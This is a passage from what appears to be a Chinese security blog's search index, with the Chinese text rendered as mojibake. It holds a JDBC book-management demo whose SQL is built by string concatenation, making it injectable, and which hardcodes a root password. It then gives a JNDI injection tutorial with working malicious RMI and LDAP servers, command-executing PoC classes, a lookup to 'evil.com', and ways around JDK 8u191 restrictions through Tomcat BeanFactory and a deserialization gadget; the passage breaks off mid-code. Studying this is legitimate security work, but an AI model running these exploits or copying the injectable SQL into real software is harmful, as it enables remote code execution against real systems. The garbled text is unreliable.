System.out.println(\u0026#34;å½“å‰æŸ¥è¯¢ç»“æœï¼šã€Š\u0026#34;+b.getbName()+\u0026#39;ã€‹\u0026#39;); } } else if (choice == 2) { ArrayList allBooks = findBooks(); if (allBooks.size() == 0) { System.out.println(\u0026#34;æ²¡æœ‰ä¹¦ç±ï¼\u0026#34;); }else { for(int i=0; i\u0026lt;allBooks.size(); i++) { Book b = (Book)(allBooks.get(i)); System.out.println(b.getbId()+\u0026#34;---\u0026#34;+b.getbName()+\u0026#34;---\u0026#34;+b.getbAuthor()+\u0026#34;---\u0026#34;+ b.getbPrice()); } } } else if (choice == 3) { System.out.println(\u0026#34;è¯·è¾“å…¥æƒ³è¦ä¸‹æ¶çš„ä¹¦ç±ç¼–å·\u0026#34;); int bno = scanner.nextInt(); int n = deleteBookByBno(bno); if (n == 0) { System.out.println(\u0026#34;æŒ‡å®šä¹¦ç±ä¸å­˜åœ¨ï¼\u0026#34;); }else{ System.out.println(\u0026#34;åˆ é™¤æˆåŠŸ\u0026#34;); } } else if (choice == 4) { String a = scanner.nextLine(); System.out.println(\u0026#34;è¯·è¾“å…¥æƒ³è¦ä¸Šæ¶çš„ä¹¦ç±åç§°\u0026#34;); String bna = scanner.nextLine(); System.out.println(\u0026#34;è¯·è¾“å…¥æƒ³è¦ä¸Šæ¶çš„ä¹¦ç±ä½œè€…\u0026#34;); String bau = scanner.nextLine(); System.out.println(\u0026#34;è¯·è¾“å…¥æƒ³è¦ä¸Šæ¶çš„ä¹¦ç±ä»·æ ¼\u0026#34;); double bpr = scanner.nextDouble(); int n = updateBookByBno(bna,bau,bpr); if (n == 0) { System.out.println(\u0026#34;ä¸Šæ¶å¤±è´¥\u0026#34;); }else { System.out.println(\u0026#34;ä¸Šæ¶æˆåŠŸ\u0026#34;); } } else if (choice == 5) { System.out.println(\u0026#34;------é€€å‡º\u0026#34;); break; } } } //æ ¹æ®ç¼–å·æŸ¥è¯¢ä¹¦ç± public static Book findBookByBno(int bno) throws ClassNotFoundException, SQLException { Book b = null; //åå°„åŠ è½½driveré©±åŠ¨ Class.forName(\u0026#34;com.mysql.cj.jdbc.Driver\u0026#34;); //è·å–è¿æ¥ String url = \u0026#34;jdbc:mysql://localhost:3306/Yuy0ung_DB?useSSL=false\u0026amp;useUnicode=true\u0026amp;characterEncoding=utf8\u0026amp;serverTimezone=Asia/Shanghai\u0026amp;allowPublicKeyRetrieval=true\u0026#34;; String username = \u0026#34;root\u0026#34;; String password = \u0026#34;Admin123456\u0026#34;; Connection conn = DriverManager.getConnection(url,username,password); //åˆ›å»ºä¼šè¯ Statement stmt = conn.createStatement(); //å‘é€sqlå‘½ä»¤ ResultSet resultSet = stmt.executeQuery(\u0026#34;select * FROM my_book WHERE id = \u0026#34; + bno); //å¤„ç†ç»“æœ if (resultSet.next()) { //ä¸ç”¨whileéå†ï¼Œå­˜åœ¨å³å¯ //è·å–æ•°æ® int id = resultSet.getInt(\u0026#34;id\u0026#34;); String name = resultSet.getString(\u0026#34;name\u0026#34;); String author = resultSet.getString(\u0026#34;author\u0026#34;); double price = resultSet.getDouble(\u0026#34;price\u0026#34;); //å°è£… b = new Book(); b.setbId(id); b.setbName(name); b.setbAuthor(author); b.setbPrice(price); } //å…³é—­æ•°æ®åº“èµ„æº stmt.close(); conn.close(); return b; } public static ArrayList findBooks() throws ClassNotFoundException, SQLException { //ä½¿ç”¨é›†åˆ ArrayList list = new ArrayList(); //åå°„åŠ è½½driveré©±åŠ¨ Class.forName(\u0026#34;com.mysql.cj.jdbc.Driver\u0026#34;); //è·å–è¿æ¥ String url = \u0026#34;jdbc:mysql://localhost:3306/Yuy0ung_DB?useSSL=false\u0026amp;useUnicode=true\u0026amp;characterEncoding=utf8\u0026amp;serverTimezone=Asia/Shanghai\u0026amp;allowPublicKeyRetrieval=true\u0026#34;; String username = \u0026#34;root\u0026#34;; String password = \u0026#34;Admin123456\u0026#34;; Connection conn = DriverManager.getConnection(url,username,password); //åˆ›å»ºä¼šè¯ Statement stmt = conn.createStatement(); //å‘é€sqlå‘½ä»¤ ResultSet resultSet = stmt.executeQuery(\u0026#34;select * FROM my_book\u0026#34;); //å¤„ç†ç»“æœ while (resultSet.next()) { //ä¸ç”¨whileéå†ï¼Œå­˜åœ¨å³å¯ //è·å–æ•°æ® int id = resultSet.getInt(\u0026#34;id\u0026#34;); String name = resultSet.getString(\u0026#34;name\u0026#34;); String author = resultSet.getString(\u0026#34;author\u0026#34;); double price = resultSet.getDouble(\u0026#34;price\u0026#34;); //å°è£… Book b = new Book(); b.setbId(id); b.setbName(name); b.setbAuthor(author); b.setbPrice(price); //å°†å°è£…å¥½çš„ä¹¦ç±åŠ å…¥é›†åˆ list.add(b); } //å…³é—­æ•°æ®åº“èµ„æº stmt.close(); conn.close(); return list; } //æ ¹æ®ç¼–å·æŸ¥è¯¢ä¹¦ç± public static int deleteBookByBno(int bno) throws ClassNotFoundException, SQLException { //åå°„åŠ è½½driveré©±åŠ¨ Class.forName(\u0026#34;com.mysql.cj.jdbc.Driver\u0026#34;); //è·å–è¿æ¥ String url = \u0026#34;jdbc:mysql://localhost:3306/Yuy0ung_DB?useSSL=false\u0026amp;useUnicode=true\u0026amp;characterEncoding=utf8\u0026amp;serverTimezone=Asia/Shanghai\u0026amp;allowPublicKeyRetrieval=true\u0026#34;; String username = \u0026#34;root\u0026#34;; String password = \u0026#34;Admin123456\u0026#34;; Connection conn = DriverManager.getConnection(url,username,password); //åˆ›å»ºä¼šè¯ Statement stmt = conn.createStatement(); //å‘é€sqlå‘½ä»¤ int i = stmt.executeUpdate(\u0026#34;delete FROM my_book WHERE id = \u0026#34; + bno); //å…³é—­æ•°æ®åº“èµ„æº stmt.close(); conn.close(); return i; } public static int updateBookByBno(String bna,String bau, double bpr) throws ClassNotFoundException, SQLException { //åå°„åŠ è½½driveré©±åŠ¨ Class.forName(\u0026#34;com.mysql.cj.jdbc.Driver\u0026#34;); //è·å–è¿æ¥ String url = \u0026#34;jdbc:mysql://localhost:3306/Yuy0ung_DB?useSSL=false\u0026amp;useUnicode=true\u0026amp;characterEncoding=utf8\u0026amp;serverTimezone=Asia/Shanghai\u0026amp;allowPublicKeyRetrieval=true\u0026#34;; String username = \u0026#34;root\u0026#34;; String password = \u0026#34;Admin123456\u0026#34;; Connection conn = DriverManager.getConnection(url,username,password); //åˆ›å»ºä¼šè¯ Statement stmt = conn.createStatement(); //å‘é€sqlå‘½ä»¤ int i = stmt.executeUpdate(\u0026#34;INSERT INTO my_book (name, author, price) VALUES (\u0026#39;\u0026#34;+bna+\u0026#34;\u0026#39;, \u0026#39;\u0026#34;+bau+\u0026#34;\u0026#39;, \u0026#34;+bpr+\u0026#34;);\u0026#34;); //å…³é—­æ•°æ®åº“èµ„æº stmt.close(); conn.close(); return i; } } bookç±»ï¼š\npackage fun.yuy0ung.test02; import java.io.Serializable; public class Book implements Serializable { //å±æ€§ private int bId; private String bName; private String bAuthor; private Double bPrice; public int getbId() { return bId; } public void setbId(int bId) { this.bId = bId; } public String getbName() { return bName; } public void setbName(String bName) { this.bName = bName; } public String getbAuthor() { return bAuthor; } public void setbAuthor(String bAuthor) { this.bAuthor = bAuthor; } public Double getbPrice() { return bPrice; } public void setbPrice(Double bPrice) { this.bPrice = bPrice; } public Book() { } } Maven é¡¹ç›®ç®¡ç†å·¥å…·\njaråŒ…ç®¡ç†æ–¹ä¾¿ ç‰ˆæœ¬æ§åˆ¶æ–¹ä¾¿ Mavené¡¹ç›®åˆ›å»º åœ¨projectå†…åˆ›å»ºmoduleå³å¯ï¼š\nå¦‚æœæ˜¯åˆ›å»ºä¸éœ€è¦archetypeçš„mavené¡¹ç›®å¯ä»¥ç›´æ¥åœ¨javaæ¨¡å—ä¸­é€‰æ‹©mavenåˆ›å»ºåŸºç¡€çš„module\nMavenåŠ è½½å¤–éƒ¨åº“ testç›®å½•ä¸‹å¯ä»¥åˆ›å»ºæµ‹è¯•ä»£ç ï¼š\næ¡†æ¶ åŠæˆå“ï¼Œå°è£…é‡è¦/é‡å¤ä»£ç ï¼Œæ·»åŠ æ›´å¤šåŠŸèƒ½\nä¼˜ç‚¹ å¥½ç”¨ å¼ºå¤§ å¼€å‘å‘¨æœŸçŸ­ ç¼ºç‚¹ å­¦ä¹ æˆæœ¬ é”™è¯¯æ¦‚ç‡ é”™è¯¯è§£å†³éš¾åº¦ åˆ†ç±» æŒä¹…å±‚æ¡†æ¶ï¼šmybatisã€spring dataã€ibatiesã€hibernate MVCæ¡†æ¶ï¼šspring MVCã€struts1ã€strust2 é¡¹ç›®ç®¡ç†æ¡†æ¶ï¼šspring framworkã€spring boot å¾®æœåŠ¡æ¡†æ¶ï¼šspring cloud æƒé™ç®¡ç†æ¡†æ¶ï¼šspring securityã€shiro mybatis æŒä¹…å±‚æ¡†æ¶ åˆ†å±‚å¼€å‘ä¸­è´Ÿè´£è®¿é—®æ•°æ®æºçš„ä¸€å±‚\nORMæ¡†æ¶ å¯¹è±¡/å…³ç³»æ˜ å°„\næ­å»º å»ºè¡¨ åˆ›å»ºé¡¹ç›® æ·»åŠ ä¾èµ–ï¼ˆmavenæ·»åŠ mybaties+mysqlé©±åŠ¨ï¼‰ ",
        "summary": "javaè¿›é˜¶ demo JDBC Javaæ•°æ®åº“è¿æ¥çš„ä¸€å¥—æ¥å£ï¼ˆè§„èŒƒï¼‰\néœ€è¦åœ¨ç¨‹åºä¸­å¼•å…¥é©±åŠ¨åŒ…ï¼š\næ’å…¥æ“ä½œ package fun.yuy0ung.test01; import java.sql.Connection; import java.sql.DriverManager; import java.sql.SQLException; import java.sql.Statement; public class Test { public static void main(String[] args) throws ClassNotFoundException, SQLException { //åå°„åŠ è½½driveré©±åŠ¨ Class.forName(\u0026#34;com.mysql.cj.jdbc.Driver\u0026#34;); //è·å–è¿æ¥ String url = \u0026#34;jdbc:mysql://localhost:3306/Yuy0ung_DB?useSSL=false\u0026amp;useUnicode=true\u0026amp;characterEncoding=utf8\u0026amp;serverTimezone=Asia/Shanghai\u0026amp;allowPublicKeyRetrieval=true\u0026#34;; String username = \u0026#34;root\u0026#34;; String password = \u0026#34;Admin123456\u0026#34;; Connection conn = DriverManager.getConnection(url,username,password); //åˆ›å»ºä¼šè¯ Statement stmt = conn.createStatement(); //å‘é€sqlå‘½ä»¤ int i = stmt.executeUpdate(\u0026#34;insert into my_book (id,name,author,price) values (3,\u0026#39;test\u0026#39;,\u0026#39;Yuy0ung\u0026#39;,49)\u0026#34;); //å¤„ç†ç»“æœ if(i \u0026gt; 0) { System.out.println(\u0026#34;success\u0026#34;); }else { System.out.println(\u0026#34;fail\u0026#34;); } //å…³é—­æ•°æ®åº“èµ„æº stmt.close(); conn.close(); } ;} è¿è¡Œç»“æœï¼š\n"
    }
,
    {
        "title": "JNDIæ³¨å…¥",
        "link": "/My-Knowlege-Database/blog/java%E5%AE%89%E5%85%A8/%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E/jndi%E6%B3%A8%E5%85%A5/",
        "content": "JNDIæ³¨å…¥ å®æˆ˜ç»å¸¸é‡åˆ°ï¼Œåªä¼šæ‰“ä¸åŠ¨åŸç†ï¼Œç°åœ¨æ¥æµ…å­¦ä¸€ä¸‹\nJNDI JNDIï¼ˆJava Naming and Directory Interfaceï¼‰æ˜¯ Java ä¸ºç»Ÿä¸€è®¿é—®å„ç§â€œå‘½åâ€å’Œâ€œç›®å½•â€æœåŠ¡è€Œè®¾è®¡çš„ä¸€å¥—æ ‡å‡†æ¥å£ï¼ˆä½äº javax.naming.*ï¼‰\nJNDIè®¾è®¡äº†ä¸€å¥—æ ‡å‡†:\næœåŠ¡ åŠŸèƒ½ JNDI SPI åŒ… å…¸å‹ URL LDAP ç›®å½• + å‘½å com.sun.jndi.ldap.LdapCtxFactory ldap://host:389/ou=People,dc=example,dc=com DNS å‘½å com.sun.jndi.dns.DnsContextFactory dns://8.8.8.8/google.com RMI è¿œç¨‹å¯¹è±¡å‘½å com.sun.jndi.rmi.registry.RegistryContextFactory rmi://host:1099/HelloObj CORBA COS åˆ†å¸ƒå¼å¯¹è±¡ç›®å½• com.sun.jndi.cosnaming.CNCtxFactory corbaname::host:1050#MyService æ–‡ä»¶ç³»ç»Ÿ æŠŠæ–‡ä»¶è·¯å¾„å½“åå­— com.sun.jndi.fscontext.RefFSContextFactory file:/tmp/jndiref è¿™ä½¿å¾—æ‰€æœ‰çš„å‘½åå’Œç›®å½•æœåŠ¡éƒ½å¯ä»¥ä½¿ç”¨åŒä¸€å¥—ä»£ç è¿›è¡Œè°ƒç”¨ï¼›\nContext ctx = new InitialContext(); // åˆå§‹åŒ–ä¸Šä¸‹æ–‡ Object obj = ctx.lookup(\u0026#34;ldap://evil.com/a\u0026#34;); // åŒä¸€è¡Œä»£ç å¯æ¢ä»»ä½•åè®® æˆ‘ä»¬çœ‹åˆ°è¿™ä¸ªä»£ç å…¶å®å·²ç»å¯ä»¥æ€è€ƒäº†ï¼Œå¦‚æœè¿™ä¸ªlookupæ–¹æ³•å†…çš„å‚æ•°å¯æ§ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨JNDIåŠ è½½ä»»æ„çš„javaæ¶æ„classæˆ–æ¶æ„ååºåˆ—åŒ–æ•°æ®\nRMI æ¥ä¸‹æ¥å­¦ä¹ å¾ˆå¸¸ç”¨çš„trickï¼Œåˆ©ç”¨RMIæœåŠ¡æ¥è¿›è¡ŒJNDIæ³¨å…¥\nRMIServer æˆ‘ä»¬å…ˆå†™ä¸€ä¸ªRMIServerï¼š\né¦–å…ˆåœ¨æœ¬æœºçš„1099ç«¯å£èµ·äº†ä¸€ä¸ªRMI Registryæ³¨å†Œè¡¨ï¼š\nLocateRegistry.createRegistry(1099); ç„¶åæ„é€ ä¸€ä¸ªæ¶æ„å¯¹è±¡ï¼Œæ­¤å¤„Referenceæ˜¯ JNDI æä¾›çš„å¯¹è±¡å¼•ç”¨å°è£…ï¼Œç”¨äºå‘Šè¯‰å®¢æˆ·ç«¯åº”è¯¥å»http://127.0.0.1:5002/ä¸‹è½½classæ–‡ä»¶ï¼Œç„¶åç”¨æŒ‡å®šå·¥å‚ç±»å®ä¾‹åŒ–\nReference reference = new Reference( \u0026#34;RMIPoc\u0026#34;, // ç±»å \u0026#34;RMIPoc\u0026#34;, // å·¥å‚ç±»åï¼ˆåŠ è½½åå®ä¾‹åŒ–ï¼‰ \u0026#34;http://127.0.0.1:5002/\u0026#34;); // è¿œç¨‹ codebaseï¼ˆjar/class ä¸‹è½½åœ°å€ï¼‰ æ¥ä¸‹æ¥æŠŠéè¿œç¨‹å¯¹è±¡ ReferenceåŒ…æˆè¿œç¨‹å¯¹è±¡å­˜æ ¹ReferenceWrapperï¼Œè®©å…¶èƒ½é€šè¿‡ RMI ä¼ è¾“ï¼š\nReferenceWrapper refObjWrapper = new ReferenceWrapper(reference); ç„¶åæŠŠhelloç»‘å®šåˆ°æ³¨å†Œè¡¨ï¼Œå®¢æˆ·ç«¯å¯ä»¥é€šè¿‡rmi://\u0026lt;attacker-ip\u0026gt;:1099/helloè¿›è¡Œè®¿é—®\nNaming.bind(\u0026#34;hello\u0026#34;,refObjWrapper); å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š\npackage com.yuy0ung; import com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.Reference; import java.rmi.Naming; import java.rmi.registry.LocateRegistry; public class RMIServer { void register() throws Exception{ LocateRegistry.createRegistry(1099); Reference reference = new Reference(\u0026#34;RMIPoc\u0026#34;,\u0026#34;RMIPoc\u0026#34;,\u0026#34;http://127.0.0.1:5003/\u0026#34;); ReferenceWrapper refObjWrapper = new ReferenceWrapper(reference); Naming.bind(\u0026#34;hello\u0026#34;,refObjWrapper); System.out.println(\u0026#34;START RUN\u0026#34;); } public static void main(String[] args) throws Exception { new RMIServer().register(); } } è¿è¡Œåå°±å¯ä»¥å¯åŠ¨ä¸€ä¸ªRMIServeräº†ï¼Œåªè¦å®¢æˆ·ç«¯è®¿é—®è¯¥æœåŠ¡ï¼Œå°±ä¼šè¿”å›ReferenceWrapperå­˜æ ¹ï¼Œå®¢æˆ·ç«¯å°±ä¼šæ ¹æ®ReferenceWrapperé‡Œçš„åœ°å€ï¼ˆæ­¤å¤„æ˜¯http://127.0.0.1:5003/ï¼‰å»è®¿é—®ä¸‹è½½RMIPoc.classæ–‡ä»¶å¹¶å®ä¾‹åŒ–\nRMIPoc é‚£ä¹ˆæˆ‘ä»¬çš„classæ–‡ä»¶åº”è¯¥æ€ä¹ˆæ„é€ å‘¢ï¼Ÿ\néœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ³¨æ„ï¼Œè¯¥ç±»éœ€è¦ç»§æ‰¿ObjectFactoryç±»ï¼Œå¹¶ä¸”æ„é€ å‡½æ•°éœ€è¦ä¸ºpublicï¼š\npackage com.yuy0ung; import javax.lang.model.element.Name; import javax.naming.Context; import java.io.IOException; import java.rmi.RemoteException; import java.util.Hashtable; public class RMIPoc { public RMIPoc() throws RemoteException { super(); try { Runtime.getRuntime().exec(\u0026#34;open -a calculator\u0026#34;); } catch (IOException e) { e.printStackTrace(); } } public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable\u0026lt;?, ?\u0026gt; environment) throws Exception { return null; } } ç¼–è¯‘ä¸€ä¸‹ï¼Œå†èµ·ä¸€ä¸ªhttpæœåŠ¡ï¼š ç°åœ¨å®¢æˆ·ç«¯å°±å¯ä»¥æ¥è®¿é—®å¹¶ä¸‹è½½classæ–‡ä»¶äº†\nRMIClient æ¥ä¸‹æ¥æ„å»ºä¸€ä¸ªå®¢æˆ·ç«¯æ¨¡æ‹Ÿå—å®³è€…ï¼Œç”¨å‰é¢æåˆ°çš„ç”¨æ³•å³å¯ï¼š\npackage com.yuy0ung; import javax.naming.InitialContext; public class RMIClient { public static void main(String[]args) throws Exception { String string = \u0026#34;rmi://localhost:1099/hello\u0026#34;; InitialContext initialContext = new InitialContext(); initialContext.lookup(string); } } è¿è¡Œå³å¯æ‰§è¡Œå‘½ä»¤ï¼Œå¼¹å‡ºè®¡ç®—å™¨ï¼š\nä¸Šé¢å®Œæˆçš„å°±æ˜¯åˆ©ç”¨RMIæœåŠ¡æ¥è¿›è¡Œçš„JNDIæ³¨å…¥æ”»å‡»\nLDAP æ¥ä¸‹æ¥å­¦ä¹ å¦‚ä½•ä½¿ç”¨LDAPæœåŠ¡è¿›è¡ŒJNDIæ³¨å…¥\nå­¦è¿‡ADåŸŸçš„åº”è¯¥æ¯”è¾ƒç†Ÿæ‚‰LDAPï¼ŒLDAPï¼ˆLightweight Directory Access Protocol ï¼Œè½»å‹ç›®å½•è®¿é—®åè®®ï¼‰æ˜¯ä¸€ç§ç›®å½•æœåŠ¡åè®®ï¼Œçº¦å®šäº† Client ä¸ Server ä¹‹é—´çš„ä¿¡æ¯äº¤äº’æ ¼å¼ã€ä½¿ç”¨çš„ç«¯å£å·ã€è®¤è¯æ–¹å¼ç­‰å†…å®¹\nLDAPServer æˆ‘ä»¬å¯ä»¥ä½¿ç”¨LDAPæœåŠ¡æ¥å­˜å‚¨Javaå¯¹è±¡ï¼Œå¦‚æœæˆ‘ä»¬æ­¤æ—¶èƒ½å¤Ÿæ§åˆ¶JNDIå»è®¿é—®å­˜å‚¨åœ¨LDAPä¸­çš„Javaæ¶æ„å¯¹è±¡ï¼Œé‚£ä¹ˆå°±æœ‰å¯èƒ½è¾¾åˆ°æ”»å‡»çš„ç›®çš„ï¼ŒLDAPèƒ½å¤Ÿå­˜å‚¨çš„Javaå¯¹è±¡å¦‚ä¸‹\nJava åºåˆ—åŒ– JNDIçš„References Marshalledå¯¹è±¡ Remote Location é…ç½®serverå‰ï¼Œå…ˆä¸‹è½½LDAPä¾èµ–ï¼š\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.unboundid\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;unboundid-ldapsdk\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.1.1\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;test\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; å®Œæ•´ä»£ç ï¼š\npackage com.yuy0ung; import com.unboundid.ldap.listener.InMemoryDirectoryServer; import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig; import com.unboundid.ldap.listener.InMemoryListenerConfig; import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult; import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor; import com.unboundid.ldap.sdk.Entry; import com.unboundid.ldap.sdk.LDAPException; import com.unboundid.ldap.sdk.LDAPResult; import com.unboundid.ldap.sdk.ResultCode; import javax.net.ServerSocketFactory; import javax.net.SocketFactory; import javax.net.ssl.SSLSocketFactory; import java.net.InetAddress; import java.net.MalformedURLException; import java.net.URL; public class LDAPServer { private static final String LDAP_BASE = \u0026#34;dc=yuy0ung,dc=com\u0026#34;; public static void main ( String[] tmp_args ) { String[] args=new String[]{\u0026#34;http://127.0.0.1:5003/#LDAPPoc\u0026#34;}; int port = 9999; try { InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE); config.setListenerConfigs(new InMemoryListenerConfig( \u0026#34;listen\u0026#34;, //$NON-NLS-1$ InetAddress.getByName(\u0026#34;0.0.0.0\u0026#34;), //$NON-NLS-1$ port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault())); config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ]))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config); System.out.println(\u0026#34;Listening on 0.0.0.0:\u0026#34; + port); //$NON-NLS-1$ ds.startListening(); } catch ( Exception e ) { e.printStackTrace(); } } private static class OperationInterceptor extends InMemoryOperationInterceptor { private URL codebase; public OperationInterceptor ( URL cb ) { this.codebase = cb; } @Override public void processSearchResult ( InMemoryInterceptedSearchResult result ) { String base = result.getRequest().getBaseDN(); Entry e = new Entry(base); try { sendResult(result, base, e); } catch ( Exception e1 ) { e1.printStackTrace(); } } protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException { URL turl = new URL(this.codebase, this.codebase.getRef().replace(\u0026#39;.\u0026#39;, \u0026#39;/\u0026#39;).concat(\u0026#34;.class\u0026#34;)); System.out.println(\u0026#34;Send LDAP reference result for \u0026#34; + base + \u0026#34; redirecting to \u0026#34; + turl); e.addAttribute(\u0026#34;javaClassName\u0026#34;, \u0026#34;foo\u0026#34;); String cbstring = this.codebase.toString(); int refPos = cbstring.indexOf(\u0026#39;#\u0026#39;); if ( refPos \u0026gt; 0 ) { cbstring = cbstring.substring(0, refPos); } e.addAttribute(\u0026#34;javaCodeBase\u0026#34;, cbstring); e.addAttribute(\u0026#34;objectClass\u0026#34;, \u0026#34;javaNamingReference\u0026#34;); //$NON-NLS-1$ e.addAttribute(\u0026#34;javaFactory\u0026#34;, this.codebase.getRef()); result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); } } } LDAPPoc pocä¹Ÿå·®ä¸å¤šï¼š\nimport javax.naming.Context; import javax.naming.Name; import javax.naming.spi.ObjectFactory; import java.io.IOException; import java.util.Hashtable; public class LDAPPoc implements ObjectFactory { public LDAPPoc() throws Exception{ try { Runtime.getRuntime().exec(\u0026#34;open -a calculator\u0026#34;); } catch (IOException e) { e.printStackTrace(); } } @Override public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable\u0026lt;?, ?\u0026gt; environment) throws Exception { return null; } } LDAPClient package com.yuy0ung; import javax.naming.InitialContext; public class LDAPClient { public static void main(String[]args) throws Exception{ String string = \u0026#34;ldap://localhost:9999/LDAPPoc\u0026#34;; InitialContext initialContext = new InitialContext(); initialContext.lookup(string); } } æœ€åä¸€æ ·çš„ç”¨æ³•ï¼ŒæˆåŠŸå‘½ä»¤æ‰§è¡Œï¼š\nç»•è¿‡é«˜ç‰ˆæœ¬é™åˆ¶ ä½¿ç”¨æœ¬åœ°çš„Reference Factoryç±» 8u191åå·²ç»é»˜è®¤ä¸å…è®¸åŠ è½½codebaseä¸­çš„è¿œç¨‹ç±»ï¼Œä½†æˆ‘ä»¬å¯ä»¥ä»æœ¬åœ°åŠ è½½åˆé€‚Reference Factoryã€‚\néœ€è¦æ³¨æ„æ˜¯ï¼Œè¯¥æœ¬åœ°å·¥å‚ç±»å¿…é¡»å®ç°javax.naming.spi.ObjectFactoryæ¥å£,å› ä¸ºåœ¨javax.naming.spi.NamingManager#getObjectFactoryFromReferenceæœ€åçš„returnè¯­å¥å¯¹Factoryç±»çš„å®ä¾‹å¯¹è±¡è¿›è¡Œäº†ç±»å‹è½¬æ¢ï¼Œå¹¶ä¸”è¯¥å·¥å‚ç±»è‡³å°‘å­˜åœ¨ä¸€ä¸ªgetObjectInstance()æ–¹æ³•ã€‚\nTomcat8 org.apache.naming.factory.BeanFactoryå°±æ˜¯æ»¡è¶³æ¡ä»¶ä¹‹ä¸€ï¼Œå¹¶ç”±äºè¯¥ç±»å­˜åœ¨äºTomcat8ä¾èµ–åŒ…ä¸­ï¼Œæ”»å‡»é¢å’ŒæˆåŠŸç‡è¿˜æ˜¯æ¯”è¾ƒé«˜çš„ã€‚\norg.apache.naming.factory.BeanFactory åœ¨ getObjectInstance() ä¸­ä¼šé€šè¿‡åå°„çš„æ–¹å¼å®ä¾‹åŒ–Referenceæ‰€æŒ‡å‘çš„ä»»æ„Bean Classï¼Œå¹¶ä¸”ä¼šè°ƒç”¨setteræ–¹æ³•ä¸ºæ‰€æœ‰çš„å±æ€§èµ‹å€¼ã€‚è€Œè¯¥Bean Classçš„ç±»åã€å±æ€§ã€å±æ€§å€¼ï¼Œå…¨éƒ½æ¥è‡ªäºReferenceå¯¹è±¡ï¼Œå‡æ˜¯æ”»å‡»è€…å¯æ§çš„ã€‚\nååºåˆ—åŒ–ç»•è¿‡ å› ä¸ºLDAP è¿˜å¯ä»¥å­˜å‚¨åºåˆ—åŒ–çš„æ•°æ®ï¼Œé‚£ä¹ˆå¦‚æœLDAPå­˜å‚¨çš„æŸä¸ªå¯¹è±¡çš„ javaSerializedData å€¼ä¸ä¸ºç©ºï¼Œåˆ™å®¢æˆ·ç«¯ä¼šé€šè¿‡è°ƒç”¨ obj.decodeObject() å¯¹è¯¥å±æ€§å€¼å†…å®¹è¿›è¡Œååºåˆ—åŒ–ã€‚å¦‚æœå®¢æˆ·ç«¯å­˜åœ¨ååºåˆ—åŒ–ç›¸å…³ç»„ä»¶æ¼æ´ï¼Œåˆ™æˆ‘ä»¬å¯ä»¥é€šè¿‡LDAPæ¥ä¼ è¾“æ¶æ„åºåˆ—åŒ–å¯¹è±¡ã€‚\nåªéœ€è¦ç¨å¾®ä¿®æ”¹ä¸€ä¸‹serverçš„ä»£ç ï¼ˆæˆ‘è¿™é‡Œç”¨çš„CC6+TemplatesåŠ¨æ€åŠ è½½å­—èŠ‚ç ï¼‰ï¼š\npackage com.yuy0ung; import com.unboundid.ldap.listener.InMemoryDirectoryServer; import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig; import com.unboundid.ldap.listener.InMemoryListenerConfig; import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult; import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor; import com.unboundid.ldap.sdk.Entry; import com.unboundid.ldap.sdk.LDAPResult; import com.unboundid.ldap.sdk.ResultCode; import javax.net.ServerSocketFactory; import javax.net.SocketFactory; import javax.net.ssl.SSLSocketFactory; import java.net.InetAddress; import java.net.URL; import java.util.Base64; public class LDAP_BS { private static final String LDAP_BASE = \u0026#34;dc=example,dc=com\u0026#34;; public static void main ( String[] tmp_args ) { String[] args=new String[]{\u0026#34;http://127.0.0.1/#BS\u0026#34;}; int port = 9999; try { InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE); config.setListenerConfigs(new InMemoryListenerConfig( \u0026#34;listen\u0026#34;, //$NON-NLS-1$ InetAddress.getByName(\u0026#34;0.0.0.0\u0026#34;), //$NON-NLS-1$ port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault())); config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[0]))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config); System.out.println(\u0026#34;Listening on 0.0.0.0:\u0026#34; + port); //$NON-NLS-1$ ds.startListening(); } catch ( Exception e ) { e.printStackTrace(); } } private static class OperationInterceptor extends InMemoryOperationInterceptor { private URL codebase; public OperationInterceptor ( URL cb ) { this.codebase = cb; } @Override public void processSearchResult ( InMemoryInterceptedSearchResult result ) { String base = result.getRequest().getBaseDN(); Entry e = new Entry(base); try { sendResult(result, base, e); } catch ( Exception e1 ) { e1.printStackTrace(); } } protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws Exception { e.addAttribute(\u0026#34;javaClassName\u0026#34;, \u0026#34;foo\u0026#34;); //getObjectè·å–Gadget e.addAttribute(\u0026#34;javaSerializedData\u0026#34;, Base64.getDecoder().decode( 